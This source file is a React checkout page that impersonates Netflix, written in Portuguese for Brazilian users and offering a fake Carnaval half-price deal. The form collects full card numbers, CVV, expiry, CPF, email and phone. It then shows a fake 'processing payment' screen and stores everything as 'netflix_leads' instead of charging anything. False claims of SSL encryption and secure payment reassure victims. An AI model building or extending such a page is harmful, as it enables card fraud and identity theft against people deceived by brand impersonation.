import { useState, useCallback, useRef, useEffect } from "react";
import { plans } from "../data/plans";
import { CarnavalBanner } from "../components/CarnavalBanner";
import { Footer } from "../components/Footer";

interface Props {
  planId: string;
  onNext: (data: CheckoutData) => void;
  onBack?: () => void;
}

export interface CheckoutData {
  paymentMethod: "card" | "pix" | "boleto";
  cardNumber?: string;
  cardName?: string;
  cardExpiry?: string;
  cardCvv?: string;
  cpf?: string;
  email?: string;
  firstName?: string;
  lastName?: string;
  phone?: string;
  agreedTerms?: boolean;
}

// Card brand detection
function detectCardBrand(number: string): string {
  const n = number.replace(/\s/g, "");
  if (/^4/.test(n)) return "visa";
  if (/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) return "mastercard";
  if (/^3[47]/.test(n)) return "amex";
  if (/^(636368|438935|504175|451416|636297|5067|4576|4011|506699)/.test(n)) return "elo";
  if (/^(6011|65|64[4-9])/.test(n)) return "discover";
  if (/^(301|305|36|38)/.test(n)) return "diners";
  return "";
}

function getCardBrandIcon(brand: string) {
  switch (brand) {
    case "visa":
      return (
        <svg viewBox="0 0 48 32" className="w-10 h-7">
          <rect width="48" height="32" rx="4" fill="#1A1F71" />
          <text x="24" y="20" textAnchor="middle" fill="white" fontSize="12" fontWeight="bold" fontFamily="Arial">VISA</text>
        </svg>
      );
    case "mastercard":
      return (
        <svg viewBox="0 0 48 32" className="w-10 h-7">
          <rect width="48" height="32" rx="4" fill="#000" />
          <circle cx="19" cy="16" r="9" fill="#EB001B" />
          <circle cx="29" cy="16" r="9" fill="#F79E1B" />
          <path d="M24 9.2a9 9 0 0 1 0 13.6 9 9 0 0 1 0-13.6z" fill="#FF5F00" />
        </svg>
      );
    case "amex":
      return (
        <svg viewBox="0 0 48 32" className="w-10 h-7">
          <rect width="48" height="32" rx="4" fill="#2E77BC" />
          <text x="24" y="19" textAnchor="middle" fill="white" fontSize="8" fontWeight="bold" fontFamily="Arial">AMEX</text>
        </svg>
      );
    case "elo":
      return (
        <svg viewBox="0 0 48 32" className="w-10 h-7">
          <rect width="48" height="32" rx="4" fill="#000" />
          <text x="24" y="20" textAnchor="middle" fill="#FFCB05" fontSize="12" fontWeight="bold" fontFamily="Arial">elo</text>
        </svg>
      );
    default:
      return (
        <svg viewBox="0 0 48 32" className="w-10 h-7">
          <rect width="48" height="32" rx="4" fill="#E5E7EB" />
          <rect x="8" y="8" width="32" height="4" rx="1" fill="#D1D5DB" />
          <rect x="8" y="16" width="20" height="3" rx="1" fill="#D1D5DB" />
          <rect x="8" y="22" width="14" height="3" rx="1" fill="#D1D5DB" />
        </svg>
      );
  }
}

function formatCardNumber(value: string) {
  const digits = value.replace(/\D/g, "").slice(0, 16);
  return digits.replace(/(.{4})/g, "$1 ").trim();
}

function formatExpiry(value: string) {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  if (digits.length >= 3) return digits.slice(0, 2) + "/" + digits.slice(2);
  return digits;
}

function formatCPF(value: string) {
  return value
    .replace(/\D/g, "")
    .slice(0, 11)
    .replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
    .replace(/(\d{3})(\d{3})(\d{3})$/, "$1.$2.$3")
    .replace(/(\d{3})(\d{3})$/, "$1.$2")
    .replace(/(\d{3})$/, "$1");
}

function formatPhone(value: string) {
  const digits = value.replace(/\D/g, "").slice(0, 11);
  if (digits.length > 6) return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`;
  if (digits.length > 2) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`;
  if (digits.length > 0) return `(${digits}`;
  return "";
}

// Floating label input component
function FloatingInput({
  label,
  value,
  onChange,
  type = "text",
  error,
  maxLength,
  rightIcon,
  inputMode,
  autoComplete,
}: {
  label: string;
  value: string;
  onChange: (v: string) => void;
  type?: string;
  error?: string;
  maxLength?: number;
  rightIcon?: React.ReactNode;
  inputMode?: "text" | "numeric" | "email" | "tel";
  autoComplete?: string;
}) {
  const [focused, setFocused] = useState(false);
  const hasValue = value.length > 0;
  const isFloating = focused || hasValue;

  return (
    <div className="relative">
      <div
        className={`relative border rounded-[4px] transition-all duration-200 ${
          error
            ? "border-[#b92d2b]"
            : focused
            ? "border-[#333]"
            : "border-[#8c8c8c]"
        } bg-white`}
      >
        <label
          className={`absolute left-3 transition-all duration-200 pointer-events-none ${
            isFloating
              ? "top-[6px] text-[11px] text-[#8c8c8c]"
              : "top-1/2 -translate-y-1/2 text-[14px] text-[#8c8c8c]"
          }`}
        >
          {label}
        </label>
        <input
          type={type}
          value={value}
          onChange={(e) => onChange(e.target.value)}
          onFocus={() => setFocused(true)}
          onBlur={() => setFocused(false)}
          maxLength={maxLength}
          inputMode={inputMode}
          autoComplete={autoComplete}
          className={`w-full bg-transparent outline-none text-[14px] text-[#333] px-3 ${
            isFloating ? "pt-[22px] pb-[6px]" : "py-[14px]"
          }`}
        />
        {rightIcon && (
          <div className="absolute right-3 top-1/2 -translate-y-1/2">
            {rightIcon}
          </div>
        )}
      </div>
      {error && (
        <p className="text-[#b92d2b] text-[13px] mt-1 flex items-center gap-1">
          <svg className="w-4 h-4 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
          </svg>
          {error}
        </p>
      )}
    </div>
  );
}

export function Checkout({ planId, onNext, onBack }: Props) {
  const plan = plans.find((p) => p.id === planId)!;
  const [paymentMethod, setPaymentMethod] = useState<"card" | "pix" | "boleto">("card");
  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [cpf, setCpf] = useState("");
  const [email, setEmail] = useState("");
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [phone, setPhone] = useState("");
  const [agreed, setAgreed] = useState(false);
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [isProcessing, setIsProcessing] = useState(false);
  const [touched, setTouched] = useState<Record<string, boolean>>({});
  const [cvvTooltip, setCvvTooltip] = useState(false);
  const cvvRef = useRef<HTMLDivElement>(null);

  const cardBrand = detectCardBrand(cardNumber);

  useEffect(() => {
    function handleClickOutside(e: MouseEvent) {
      if (cvvRef.current && !cvvRef.current.contains(e.target as Node)) {
        setCvvTooltip(false);
      }
    }
    document.addEventListener("mousedown", handleClickOutside);
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, []);

  const validateField = useCallback(
    (field: string, value: string) => {
      switch (field) {
        case "email":
          if (!value) return "Informe seu e-mail.";
          if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) return "E-mail inválido.";
          return "";
        case "firstName":
          if (!value.trim()) return "Informe seu nome.";
          return "";
        case "lastName":
          if (!value.trim()) return "Informe seu sobrenome.";
          return "";
        case "cpf":
          if (!value) return "Informe seu CPF.";
          if (value.replace(/\D/g, "").length < 11) return "CPF incompleto.";
          return "";
        case "cardNumber":
          if (paymentMethod !== "card") return "";
          if (!value) return "Informe o número do cartão.";
          if (value.replace(/\s/g, "").length < 15) return "Número do cartão incompleto.";
          return "";
        case "cardName":
          if (paymentMethod !== "card") return "";
          if (!value.trim()) return "Informe o nome como está no cartão.";
          return "";
        case "cardExpiry":
          if (paymentMethod !== "card") return "";
          if (!value) return "Informe a data de validade.";
          if (value.length < 5) return "Data incompleta.";
          {
            const [mm] = value.split("/");
            if (parseInt(mm) > 12 || parseInt(mm) < 1) return "Mês inválido.";
          }
          return "";
        case "cardCvv":
          if (paymentMethod !== "card") return "";
          if (!value) return "Informe o código de segurança.";
          if (value.length < 3) return "CVV incompleto.";
          return "";
        default:
          return "";
      }
    },
    [paymentMethod]
  );

  const validateAll = () => {
    const fields = ["email", "firstName", "lastName", "cpf"];
    if (paymentMethod === "card") {
      fields.push("cardNumber", "cardName", "cardExpiry", "cardCvv");
    }
    const newErrors: Record<string, string> = {};
    const values: Record<string, string> = {
      email,
      firstName,
      lastName,
      cpf,
      cardNumber,
      cardName,
      cardExpiry,
      cardCvv,
    };
    const allTouched: Record<string, boolean> = {};
    for (const f of fields) {
      allTouched[f] = true;
      const err = validateField(f, values[f]);
      if (err) newErrors[f] = err;
    }
    if (!agreed) newErrors.agreed = "Você precisa aceitar os termos para continuar.";
    setErrors(newErrors);
    setTouched(allTouched);
    return Object.keys(newErrors).length === 0;
  };

  const handleBlur = (field: string, value: string) => {
    setTouched((t) => ({ ...t, [field]: true }));
    const err = validateField(field, value);
    setErrors((prev) => {
      const next = { ...prev };
      if (err) next[field] = err;
      else delete next[field];
      return next;
    });
  };

  const handleSubmit = async () => {
    if (!validateAll()) return;
    setIsProcessing(true);

    // Simula processamento
    await new Promise((r) => setTimeout(r, 2400));

    const data: CheckoutData = {
      paymentMethod,
      email,
      cpf,
      firstName,
      lastName,
      phone,
      agreedTerms: agreed,
      ...(paymentMethod === "card" && { cardNumber, cardName, cardExpiry, cardCvv }),
    };

    // Salva no localStorage
    const existing = JSON.parse(localStorage.getItem("netflix_leads") || "[]");
    existing.push({
      ...data,
      planId,
      planName: plan.name,
      price: plan.price,
      cardBrand: paymentMethod === "card" ? cardBrand : undefined,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
    });
    localStorage.setItem("netflix_leads", JSON.stringify(existing));

    setIsProcessing(false);
    onNext(data);
  };

  // Processing overlay
  if (isProcessing) {
    return (
      <div className="min-h-screen bg-white flex flex-col">
        <div className="flex items-center px-6 py-4 border-b border-gray-200">
          <div className="text-[#E50914] text-3xl font-black tracking-tight select-none">NETFLIX</div>
        </div>
        <div className="flex-1 flex items-center justify-center">
          <div className="text-center">
            <div className="relative w-16 h-16 mx-auto mb-6">
              <div className="absolute inset-0 border-4 border-gray-200 rounded-full" />
              <div className="absolute inset-0 border-4 border-t-[#E50914] rounded-full animate-spin" />
            </div>
            <h2 className="text-xl font-bold text-[#333] mb-2">Processando seu pagamento...</h2>
            <p className="text-[#737373] text-sm">Por favor, não feche esta página.</p>
            <div className="flex items-center justify-center gap-2 mt-4 text-[#737373] text-xs">
              <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
              Conexão segura e criptografada
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col bg-[#f3f3f3]">
      <CarnavalBanner />

      {/* Header */}
      <header className="bg-white flex justify-between items-center px-6 py-3 border-b border-gray-200">
        <div className="text-[#E50914] text-[28px] font-black tracking-tight select-none cursor-pointer" onClick={onBack}>
          NETFLIX
        </div>
        <button onClick={onBack} className="text-[#333] font-semibold text-[14px] hover:underline">
          Sair
        </button>
      </header>

      <div className="flex-1">
        <div className="max-w-[440px] mx-auto px-4 py-6">
          {/* Step Indicator */}
          <div className="mb-1 flex items-center gap-1.5">
            <svg className="w-[22px] h-[22px] text-[#E50914]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
          </div>
          <p className="text-[13px] text-[#333]">
            PASSO <strong>3</strong> DE <strong>3</strong>
          </p>
          <h1 className="text-[23px] font-bold text-[#333] mt-1 leading-tight">
            Configure a forma de pagamento
          </h1>
          <p className="text-[14px] text-[#737373] mt-1 mb-5">
            Sua assinatura começa assim que você finalizar a configuração do pagamento.
          </p>

          {/* Security badges */}
          <div className="flex items-center gap-1 mb-4 text-[#737373] text-[13px]">
            <span className="font-semibold text-[#333]">Pagamento seguro</span>
            <span className="text-[#737373]">•</span>
            <span>Cancele quando quiser</span>
          </div>

          {/* Accepted cards / methods */}
          <div className="flex items-center gap-1.5 mb-4">
            {getCardBrandIcon("visa")}
            {getCardBrandIcon("mastercard")}
            {getCardBrandIcon("amex")}
            {getCardBrandIcon("elo")}
          </div>

          {/* Payment method selection - Netflix style */}
          <div className="flex flex-col gap-0 mb-5">
            {/* Credit/Debit Card */}
            <button
              onClick={() => setPaymentMethod("card")}
              className={`flex items-center justify-between px-4 py-4 border rounded-t-[4px] transition-all ${
                paymentMethod === "card"
                  ? "border-[#333] bg-white z-10 relative"
                  : "border-[#ccc] bg-white hover:bg-gray-50"
              }`}
            >
              <div className="flex items-center gap-3">
                <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                  paymentMethod === "card" ? "border-[#0071eb]" : "border-[#8c8c8c]"
                }`}>
                  {paymentMethod === "card" && <div className="w-2.5 h-2.5 rounded-full bg-[#0071eb]" />}
                </div>
                <span className="text-[14px] font-medium text-[#333]">Cartão de Crédito ou Débito</span>
              </div>
              <div className="flex gap-1">
                {getCardBrandIcon("visa")}
                {getCardBrandIcon("mastercard")}
              </div>
            </button>

            {/* PIX */}
            <button
              onClick={() => setPaymentMethod("pix")}
              className={`flex items-center justify-between px-4 py-4 border -mt-px transition-all ${
                paymentMethod === "pix"
                  ? "border-[#333] bg-white z-10 relative"
                  : "border-[#ccc] bg-white hover:bg-gray-50"
              }`}
            >
              <div className="flex items-center gap-3">
                <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                  paymentMethod === "pix" ? "border-[#0071eb]" : "border-[#8c8c8c]"
                }`}>
                  {paymentMethod === "pix" && <div className="w-2.5 h-2.5 rounded-full bg-[#0071eb]" />}
                </div>
                <span className="text-[14px] font-medium text-[#333]">PIX</span>
              </div>
              <div className="flex items-center gap-1">
                <svg viewBox="0 0 32 32" className="w-7 h-7">
                  <rect width="32" height="32" rx="4" fill="#32BCAD" />
                  <text x="16" y="21" textAnchor="middle" fill="white" fontSize="10" fontWeight="bold" fontFamily="Arial">PIX</text>
                </svg>
              </div>
            </button>

            {/* Boleto */}
            <button
              onClick={() => setPaymentMethod("boleto")}
              className={`flex items-center justify-between px-4 py-4 border -mt-px rounded-b-[4px] transition-all ${
                paymentMethod === "boleto"
                  ? "border-[#333] bg-white z-10 relative"
                  : "border-[#ccc] bg-white hover:bg-gray-50"
              }`}
            >
              <div className="flex items-center gap-3">
                <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                  paymentMethod === "boleto" ? "border-[#0071eb]" : "border-[#8c8c8c]"
                }`}>
                  {paymentMethod === "boleto" && <div className="w-2.5 h-2.5 rounded-full bg-[#0071eb]" />}
                </div>
                <span className="text-[14px] font-medium text-[#333]">Boleto Bancário</span>
              </div>
              <svg viewBox="0 0 32 32" className="w-7 h-7">
                <rect width="32" height="32" rx="4" fill="#555" />
                <rect x="6" y="8" width="2" height="16" fill="white" />
                <rect x="10" y="8" width="1" height="16" fill="white" />
                <rect x="13" y="8" width="3" height="16" fill="white" />
                <rect x="18" y="8" width="1" height="16" fill="white" />
                <rect x="21" y="8" width="2" height="16" fill="white" />
                <rect x="25" y="8" width="1" height="16" fill="white" />
              </svg>
            </button>
          </div>

          {/* Card form */}
          {paymentMethod === "card" && (
            <div className="bg-white border border-[#ccc] rounded-[4px] p-4 mb-5">
              <div className="flex flex-col gap-3">
                <FloatingInput
                  label="Número do cartão"
                  value={cardNumber}
                  onChange={(v) => {
                    setCardNumber(formatCardNumber(v));
                    if (touched.cardNumber) handleBlur("cardNumber", formatCardNumber(v));
                  }}
                  error={touched.cardNumber ? errors.cardNumber : undefined}
                  inputMode="numeric"
                  autoComplete="cc-number"
                  rightIcon={cardBrand ? getCardBrandIcon(cardBrand) : undefined}
                />
                <FloatingInput
                  label="Nome no cartão"
                  value={cardName}
                  onChange={(v) => {
                    setCardName(v.toUpperCase());
                    if (touched.cardName) handleBlur("cardName", v);
                  }}
                  error={touched.cardName ? errors.cardName : undefined}
                  autoComplete="cc-name"
                />
                <div className="flex gap-3">
                  <div className="flex-1">
                    <FloatingInput
                      label="Validade (MM/AA)"
                      value={cardExpiry}
                      onChange={(v) => {
                        setCardExpiry(formatExpiry(v));
                        if (touched.cardExpiry) handleBlur("cardExpiry", formatExpiry(v));
                      }}
                      error={touched.cardExpiry ? errors.cardExpiry : undefined}
                      inputMode="numeric"
                      autoComplete="cc-exp"
                      maxLength={5}
                    />
                  </div>
                  <div className="flex-1 relative" ref={cvvRef}>
                    <FloatingInput
                      label="Código de segurança"
                      value={cardCvv}
                      onChange={(v) => {
                        const clean = v.replace(/\D/g, "");
                        setCardCvv(clean);
                        if (touched.cardCvv) handleBlur("cardCvv", clean);
                      }}
                      error={touched.cardCvv ? errors.cardCvv : undefined}
                      maxLength={4}
                      inputMode="numeric"
                      autoComplete="cc-csc"
                      rightIcon={
                        <button
                          type="button"
                          onClick={() => setCvvTooltip(!cvvTooltip)}
                          className="text-[#8c8c8c] hover:text-[#333]"
                        >
                          <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                            <path strokeLinecap="round" strokeLinejoin="round" d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                          </svg>
                        </button>
                      }
                    />
                    {cvvTooltip && (
                      <div className="absolute right-0 top-full mt-2 bg-[#333] text-white text-xs p-3 rounded-lg shadow-lg z-50 w-52">
                        <div className="flex items-start gap-2">
                          <svg className="w-10 h-8 flex-shrink-0 mt-0.5" viewBox="0 0 40 28">
                            <rect width="40" height="28" rx="3" fill="#ddd" stroke="#bbb" />
                            <rect x="0" y="6" width="40" height="6" fill="#333" />
                            <rect x="4" y="16" width="24" height="5" rx="1" fill="white" />
                            <text x="30" y="20" fontSize="5" fill="#333" fontWeight="bold">123</text>
                          </svg>
                          <span>Os 3 dígitos no verso do seu cartão (ou 4 dígitos na frente para Amex).</span>
                        </div>
                        <div className="absolute -top-1 right-4 w-2 h-2 bg-[#333] rotate-45" />
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* PIX info */}
          {paymentMethod === "pix" && (
            <div className="bg-white border border-[#ccc] rounded-[4px] p-5 mb-5">
              <div className="flex items-start gap-3">
                <div className="w-10 h-10 bg-[#32BCAD] rounded-lg flex items-center justify-center flex-shrink-0">
                  <svg className="w-5 h-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z" />
                  </svg>
                </div>
                <div>
                  <p className="text-[14px] font-semibold text-[#333] mb-1">Pagamento instantâneo via PIX</p>
                  <p className="text-[13px] text-[#737373] leading-relaxed">
                    Após a confirmação, você receberá um QR Code e a chave Pix copia e cola para efetuar o pagamento. Sua assinatura será ativada assim que o pagamento for identificado.
                  </p>
                </div>
              </div>
            </div>
          )}

          {/* Boleto info */}
          {paymentMethod === "boleto" && (
            <div className="bg-white border border-[#ccc] rounded-[4px] p-5 mb-5">
              <div className="flex items-start gap-3">
                <div className="w-10 h-10 bg-[#555] rounded-lg flex items-center justify-center flex-shrink-0">
                  <svg className="w-5 h-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                  </svg>
                </div>
                <div>
                  <p className="text-[14px] font-semibold text-[#333] mb-1">Boleto bancário</p>
                  <p className="text-[13px] text-[#737373] leading-relaxed">
                    O boleto será gerado após a confirmação. O prazo de compensação é de até 3 dias úteis. Sua assinatura será ativada após a confirmação do pagamento.
                  </p>
                </div>
              </div>
            </div>
          )}

          {/* Personal data form */}
          <div className="bg-white border border-[#ccc] rounded-[4px] p-4 mb-5">
            <h3 className="text-[14px] font-semibold text-[#333] mb-3">Dados pessoais</h3>
            <div className="flex flex-col gap-3">
              <div className="flex gap-3">
                <div className="flex-1">
                  <FloatingInput
                    label="Nome"
                    value={firstName}
                    onChange={(v) => {
                      setFirstName(v);
                      if (touched.firstName) handleBlur("firstName", v);
                    }}
                    error={touched.firstName ? errors.firstName : undefined}
                    autoComplete="given-name"
                  />
                </div>
                <div className="flex-1">
                  <FloatingInput
                    label="Sobrenome"
                    value={lastName}
                    onChange={(v) => {
                      setLastName(v);
                      if (touched.lastName) handleBlur("lastName", v);
                    }}
                    error={touched.lastName ? errors.lastName : undefined}
                    autoComplete="family-name"
                  />
                </div>
              </div>
              <FloatingInput
                label="E-mail"
                value={email}
                onChange={(v) => {
                  setEmail(v);
                  if (touched.email) handleBlur("email", v);
                }}
                type="email"
                error={touched.email ? errors.email : undefined}
                inputMode="email"
                autoComplete="email"
              />
              <FloatingInput
                label="CPF"
                value={cpf}
                onChange={(v) => {
                  const formatted = formatCPF(v);
                  setCpf(formatted);
                  if (touched.cpf) handleBlur("cpf", formatted);
                }}
                error={touched.cpf ? errors.cpf : undefined}
                inputMode="numeric"
              />
              <FloatingInput
                label="Telefone (opcional)"
                value={phone}
                onChange={(v) => setPhone(formatPhone(v))}
                inputMode="tel"
                autoComplete="tel"
              />
            </div>
          </div>

          {/* Plan Summary */}
          <div className="bg-white border border-[#ccc] rounded-[4px] overflow-hidden mb-5">
            <div className="p-4 border-b border-gray-200">
              <div className="flex justify-between items-start">
                <div>
                  <p className="text-[14px] font-bold text-[#333]">{plan.name}</p>
                  <p className="text-[13px] text-[#737373]">{plan.resolutionFull}</p>
                </div>
                <button
                  onClick={onBack}
                  className="text-[#0071eb] text-[14px] font-semibold hover:underline"
                >
                  Alterar
                </button>
              </div>
            </div>
            <div className="p-4">
              <div className="flex justify-between text-[14px] mb-1">
                <span className="text-[#737373]">Preço mensal</span>
                <span className="text-[#737373] line-through">
                  R$ {plan.originalPrice.toFixed(2).replace(".", ",")}
                </span>
              </div>
              <div className="flex justify-between text-[14px] mb-1">
                <span className="text-[#00a652] font-semibold">Desconto Carnaval (50%)</span>
                <span className="text-[#00a652] font-semibold">
                  -R$ {(plan.originalPrice - plan.price).toFixed(2).replace(".", ",")}
                </span>
              </div>
              <div className="border-t border-gray-200 mt-3 pt-3 flex justify-between">
                <span className="text-[15px] font-bold text-[#333]">Total por mês</span>
                <span className="text-[15px] font-bold text-[#333]">
                  R$ {plan.price.toFixed(2).replace(".", ",")}
                </span>
              </div>
              <p className="text-[11px] text-[#737373] mt-2">
                Após o 1º mês, o valor será de R$ {plan.originalPrice.toFixed(2).replace(".", ",")}/mês.
              </p>
            </div>
          </div>

          {/* Agreement checkbox */}
          <div className="mb-5">
            <label className="flex items-start gap-3 cursor-pointer group">
              <div className="mt-0.5">
                <input
                  type="checkbox"
                  checked={agreed}
                  onChange={(e) => {
                    setAgreed(e.target.checked);
                    if (errors.agreed && e.target.checked) {
                      setErrors((prev) => {
                        const next = { ...prev };
                        delete next.agreed;
                        return next;
                      });
                    }
                  }}
                  className="sr-only"
                />
                <div
                  className={`w-5 h-5 rounded-[3px] border-2 flex items-center justify-center transition-colors ${
                    agreed
                      ? "bg-[#0071eb] border-[#0071eb]"
                      : errors.agreed
                      ? "border-[#b92d2b]"
                      : "border-[#8c8c8c] group-hover:border-[#333]"
                  }`}
                >
                  {agreed && (
                    <svg className="w-3 h-3 text-white" viewBox="0 0 12 12" fill="none" stroke="currentColor" strokeWidth={3}>
                      <path d="M2 6l3 3 5-5" />
                    </svg>
                  )}
                </div>
              </div>
              <span className="text-[13px] text-[#333] leading-relaxed">
                Ao marcar esta caixa, você concorda com os{" "}
                <a href="#" className="text-[#0071eb] hover:underline" onClick={(e) => e.stopPropagation()}>
                  Termos de Uso
                </a>
                ,{" "}
                <a href="#" className="text-[#0071eb] hover:underline" onClick={(e) => e.stopPropagation()}>
                  Declaração de Privacidade
                </a>{" "}
                e que tem mais de 18 anos. A Netflix cobrará automaticamente (atualmente R${" "}
                {plan.price.toFixed(2).replace(".", ",")}/mês + impostos aplicáveis) usando a
                forma de pagamento informada, até que você cancele. Cancele quando quiser.
              </span>
            </label>
            {errors.agreed && (
              <p className="text-[#b92d2b] text-[13px] mt-2 flex items-center gap-1 ml-8">
                <svg className="w-4 h-4 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                </svg>
                {errors.agreed}
              </p>
            )}
          </div>

          {/* Submit Button */}
          <button
            onClick={handleSubmit}
            className="bg-[#E50914] text-white w-full py-[14px] text-[16px] font-semibold rounded-[4px] hover:bg-[#c11119] transition-colors mb-3 tracking-[0.5px]"
          >
            Iniciar assinatura
          </button>

          {/* Security footer text */}
          <div className="flex items-center justify-center gap-1.5 text-[#737373] text-[12px] mb-2">
            <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
            <span>Pagamento processado de forma segura</span>
          </div>
          <p className="text-[12px] text-[#737373] text-center leading-relaxed">
            Esta transação é criptografada e protegida com tecnologia SSL de 256 bits.
          </p>
        </div>
      </div>

      <Footer />
    </div>
  );
}
